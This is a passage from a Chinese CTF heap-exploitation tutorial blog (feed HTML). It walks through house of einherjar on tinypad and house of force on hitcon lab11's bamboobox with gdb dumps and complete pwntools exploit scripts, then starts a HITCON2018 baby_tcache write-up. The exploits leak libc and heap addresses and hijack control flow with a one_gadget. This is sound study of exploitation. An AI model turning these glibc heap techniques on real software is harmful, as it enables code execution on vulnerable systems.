title="https://luomuxiaoxiao.com/?p=516">linux_x86程序启动中文版<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL2RicC1jb25zdWx0aW5nLmNvbS90dXRvcmlhbHMvZGVidWdnaW5nL2xpbnV4UHJvZ3JhbVN0YXJ0dXAuaHRtbA==" title="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">linux_x86程序启动英文版<i class="fa fa-external-link"></i></span></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">84	../sysdeps/unix/syscall-template.S: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0xfffffffffffffe00</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7f30af211260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line"> RDX  0x1</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x7fff48b59964 ◂— 0x7b51190000000000</span><br><span class="line"> R8   0x1</span><br><span class="line"> R9   0x1999999999999999</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fff48b59a80 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fff48b59900 —▸ 0x7fff48b59950 —▸ 0x7fff48b59970 —▸ 0x7fff48b599a0 —▸ 0x401370 (__libc_csu_init) ◂— ...</span><br><span class="line"> RSP  0x7fff48b598b8 —▸ 0x400ed9 (_read_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line"> RIP  0x7f30af211260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0x7f30af211260 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff</span><br><span class="line">   0x7f30af211266 &lt;__read_nocancel+13&gt;    jae    <span class="built_in">read</span>+73 &lt;0x7f30af211299&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f30af211299 &lt;<span class="built_in">read</span>+73&gt;               mov    rcx, qword ptr [rip + 0x2ccbd8]</span><br><span class="line">   0x7f30af2112a0 &lt;<span class="built_in">read</span>+80&gt;               neg    eax</span><br><span class="line">   0x7f30af2112a2 &lt;<span class="built_in">read</span>+82&gt;               mov    dword ptr fs:[rcx], eax</span><br><span class="line">   0x7f30af2112a5 &lt;<span class="built_in">read</span>+85&gt;               or     rax, 0xffffffffffffffff</span><br><span class="line">   0x7f30af2112a9 &lt;<span class="built_in">read</span>+89&gt;               ret    </span><br><span class="line"> </span><br><span class="line">   0x7f30af2112aa                         nop    word ptr [rax + rax]</span><br><span class="line">   0x7f30af2112b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2489], 0 &lt;0x7f30af4e3740&gt;</span><br><span class="line">   0x7f30af2112b7 &lt;write+7&gt;               jne    write+25 &lt;0x7f30af2112c9&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f30af2112c9 &lt;write+25&gt;              sub    rsp, 8</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fff48b598b8 —▸ 0x400ed9 (_read_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">01:0008│      0x7fff48b598c0 —▸ 0x7fff48b598f0 —▸ 0x4018d8 (prompt_cmd) ◂— sub    byte ptr [rbx + 0x4d], al /* <span class="string">'(CMD)&gt;&gt;&gt; '</span> */</span><br><span class="line">02:0010│      0x7fff48b598c8 ◂— 0x1</span><br><span class="line">03:0018│      0x7fff48b598d0 —▸ 0x7fff48b59964 ◂— 0x7b51190000000000</span><br><span class="line">04:0020│      0x7fff48b598d8 —▸ 0x400fad (_write_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">05:0028│      0x7fff48b598e0 —▸ 0x401a29 ◂— or     al, byte ptr [rax] /* <span class="string">'\n'</span> */</span><br><span class="line">06:0030│      0x7fff48b598e8 ◂— 0x0</span><br><span class="line">07:0038│      0x7fff48b598f0 —▸ 0x4018d8 (prompt_cmd) ◂— sub    byte ptr [rbx + 0x4d], al /* <span class="string">'(CMD)&gt;&gt;&gt; '</span> */</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0     7f30af211260 __read_nocancel+7</span><br><span class="line">   f 1           400ed9 _read_n+112</span><br><span class="line">   f 2           401100 read_until+73</span><br><span class="line">   f 3           400832 getcmd+92</span><br><span class="line">   f 4           4009c1 main+350</span><br><span class="line">   f 5     7f30af13a830 __libc_start_main+240</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ find <span class="string">'0x7f30af13a830'</span></span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">'0x7f30af13a830'</span> <span class="keyword">in</span>: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">[stack] : 0x7fff48b599a8 --&gt; 0x7f30af13a830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">gdb-peda$ p 0x7fff48b599a8-0x7fff48b59a98</span><br><span class="line"><span class="variable">$1</span> = 0xffffffffffffff10</span><br><span class="line">gdb-peda$ p 0x7fff48b59a98-0x7fff48b599a8</span><br><span class="line"><span class="variable">$2</span> = 0xf0</span><br></pre></td></tr></table></figure><p>这里说下怎么找偏移，<br>从environ里leak出来的地址[+] main_ret: 0x7fff48b59a98，在与find出来的地址，find 的话，是find上面的f5那个地址，就是查找存了这个地址的位置，然后计算下偏移就行了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p 0x7fff48b59a98-0x7fff48b599a8</span><br><span class="line"><span class="variable">$2</span> = 0xf0</span><br></pre></td></tr></table></figure><p>完结，撒花</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./tinypad'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./tinypad'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"(CMD)&gt;&gt;&gt; "</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"A"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(SIZE)&gt;&gt;&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="string">"D"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"E"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line">    io.sendlineafter(<span class="string">"(Y/n)&gt;&gt;&gt; "</span>, <span class="string">"Y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="string">"Q"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#stage 1 leak the addr</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'1'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'2'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'3'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"INDEX: 1\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    heap = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x120</span></span><br><span class="line">    io.success(<span class="string">"heap: 0x%x"</span> % heap)</span><br><span class="line">    io.recvuntil(<span class="string">"INDEX: 3\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    leak_libc = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">    io.success(<span class="string">"main_arena: 0x%x"</span> %leak_libc)</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x3c4b20</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#stage 2</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'2'</span>*<span class="number">0xf8</span> + p64(<span class="number">0x11</span>))</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'3'</span>*<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'4'</span>*<span class="number">0xf8</span>)</span><br><span class="line">    </span><br><span class="line">    tinypad = <span class="number">0x0000000000602040</span></span><br><span class="line">    offset = heap + <span class="number">0x20</span> - (<span class="number">0x602040</span> + <span class="number">0x20</span>)</span><br><span class="line">    io.success(<span class="string">"offset: 0x%x"</span> % offset)</span><br><span class="line">    fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x602060</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + fake_chunk)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x10</span> + p64(offset))</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(leak_libc + <span class="number">88</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#stage 3</span></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line"></span><br><span class="line">    io.success(<span class="string">"environ_pointer: 0x%x"</span> % environ_pointer)</span><br><span class="line">    add(<span class="number">0xf0</span>, <span class="string">'1'</span>*<span class="number">0xd0</span> + p64(<span class="number">0x18</span>) + p64(environ_pointer) + <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x602148</span>))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">" #   INDEX: 1\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    main_ret = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x8</span> * <span class="number">30</span></span><br><span class="line">    io.success(<span class="string">"main_ret: %x"</span> % main_ret)</span><br><span class="line">    edit(<span class="number">2</span>, p64(main_ret))</span><br><span class="line">    edit(<span class="number">1</span>, p64(one_gadget))</span><br><span class="line">    quit()</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="hitcontraning-lab11"><a href="#hitcontraning-lab11" class="headerlink" title="hitcontraning_lab11"></a>hitcontraning_lab11</h2><p>这题算是实验，所以直接调试exp，<br>运行环境： libc2.23.so</p><p>最新的libc2.29似乎加入了检查，运行exp报错</p><h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>申请一个堆块状态，目的是覆盖top chunk</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/30gx 0x25ed000</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x0000000a61616464	0x0000000000000000</span><br><span class="line">0x25ed040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed060:	0x0000000000000000	0x0000000000020fa1</span><br><span class="line">0x25ed070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>通过edit 覆盖到top chunk的size部分</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/30gx 0x25ed030-0x30</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed060:	0x6161616161616161	0xffffffffffffffff</span><br><span class="line">0x25ed070:	0x000000000000000a	0x0000000000000000</span><br></pre></td></tr></table></figure><p>此时top chunk位置0x00000000025ed060</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p &amp;main_arena</span><br><span class="line"><span class="variable">$1</span> = (malloc_state *) 0x7f2a72614b20 &lt;main_arena&gt;</span><br><span class="line">gdb-peda$ x/20gx 0x7f2a72614b20</span><br><span class="line">0x7f2a72614b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00000000025ed060</span><br></pre></td></tr></table></figure><p>位置为0x25ed060处，我们要覆盖的是0x25ed010处指针，故偏移为0x25ed060-0x25ed010-0x10 = 0x60</p><p>不过是负的，我们要往上偏移，所以要malloc(-)的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T)(<span class="number">-2</span> * MINSIZE))</span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="line">        __set_errno(ENOMEM);                                                   \</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;                                                              \</span><br><span class="line">    &#125;                                                                          \</span><br><span class="line">    (sz) = request2size(req);</span><br></pre></td></tr></table></figure><p>这里先要过掉第一个检查， -2*MINSIZE，可以pass,接下来要让我们的<br>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 刚好等于=-60<br>所以要减掉个SIZE_SZ, -68就是malloc大小了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p &amp;main_arena</span><br><span class="line"><span class="variable">$1</span> = (malloc_state *) 0x7f2a72614b20 &lt;main_arena&gt;</span><br><span class="line">gdb-peda$ x/20gx 0x7f2a72614b20</span><br><span class="line">0x7f2a72614b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00000000025ed000</span><br><span class="line">0x7f2a72614b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x00007f2a72614b78</span><br><span class="line">0x7f2a72614b90 &lt;main_arena+112&gt;:	0x00007f2a72614b78	0x00007f2a72614b88</span><br><span class="line">0x7f2a72614ba0 &lt;main_arena+128&gt;:	0x00007f2a72614b88	0x00007f2a72614b98</span><br><span class="line">0x7f2a72614bb0 &lt;main_arena+144&gt;:	0x00007f2a72614b98	0x00007f2a72614ba8</span><br><span class="line">gdb-peda$ x/10gx 0x00000000025ed000</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000059</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed040:	0x6161616161616161	0x6161616161616161</span><br></pre></td></tr></table></figure><p>你看成功转移到这里了，现在在malloc一次就可以了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x1483000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x21, </span><br><span class="line">  fd = 0x400d49 &lt;magic&gt;, </span><br><span class="line">  bk = 0x400d49 &lt;magic&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x39</span><br><span class="line">&#125;</span><br><span class="line">0x1483020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x39, </span><br><span class="line">  fd = 0x6161616161616161, </span><br><span class="line">  bk = 0x6161616161616161, </span><br><span class="line">  fd_nextsize = 0x6161616161616161, </span><br><span class="line">  bk_nextsize = 0x6161616161616161</span><br><span class="line">&#125;</span><br><span class="line">0x1483058 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x6161616161616161, </span><br><span class="line">  size = 0x6161616161616161, </span><br><span class="line">  fd = 0xffffffffffffa1, </span><br><span class="line">  bk = 0xa, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功覆盖，最后退出一下就好了</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>这里直接用的ctf-wiki的exp,我只改动了一处，他还减多个0xf,没看懂，所以删掉了，也没事</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">additem</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx, length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line"><span class="comment"># we must alloc enough size, so as to successfully alloc from fake topchunk</span></span><br><span class="line">additem(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)  <span class="comment"># idx 0</span></span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span>  <span class="comment"># idx 0's content</span></span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0xffffffffffffffff</span>)  <span class="comment"># top chunk's prev_size and size</span></span><br><span class="line"><span class="comment"># modify topchunk's size to -1</span></span><br><span class="line">modify(<span class="number">0</span>, <span class="number">0x41</span>, payload)</span><br><span class="line"><span class="comment"># top chunk's offset to heap base</span></span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc_size = offset_to_heap_base - <span class="number">0x8</span> </span><br><span class="line">additem(malloc_size, <span class="string">"dada"</span>)</span><br><span class="line">additem(<span class="number">0x10</span>, p64(magic) * <span class="number">2</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一次性学了house of einherjar和house of force,ctf-wiki还是强，不过有些得自己调试才好,适合自己的才是最好的</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/14c79378/">https://noone-hub.github.io/posts/14c79378/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程8</title>
    <url>/posts/63c0a3ee/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程8"><a href="#pwn堆入门系列教程8" class="headerlink" title="pwn堆入门系列教程8"></a>pwn堆入门系列教程8</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjM3Nw==" title="https://xz.aliyun.com/t/6377">pwn堆入门系列教程5<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQwNg==" title="https://xz.aliyun.com/t/6406">pwn堆入门系列教程6<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ0OQ==" title="https://xz.aliyun.com/t/6449">pwn堆入门系列教程7<i class="fa fa-external-link"></i></span></p><p>这篇文章感觉算堆又不算堆，因为要结合到IO_FILE攻击部分，而且最主要是IO_FILE的利用，此题又学习到新的东西了，以前只玩过IO_FILE的伪造vtable,这次的leak方法第一次见</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="HITCON2018-baby-tcache"><a href="#HITCON2018-baby-tcache" class="headerlink" title="HITCON2018 baby_tcache"></a>HITCON2018 baby_tcache</h2><p>这道题我故意将其与tcache中的第一道题分开，因为这道题难度不在于tcache的攻击，而在于IO_FILE的利用，利用上一篇文章中的方法也很容易构造overlap，但libc却无法泄露，我自己纠结好久过后，还是看了wp</p><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>新建一个堆块，存在off-by-one</li><li>删除一个堆块</li><li>退出</li></ol><p>无leak函数</p><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_C6B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">":("</span>);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !qword_202060[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> 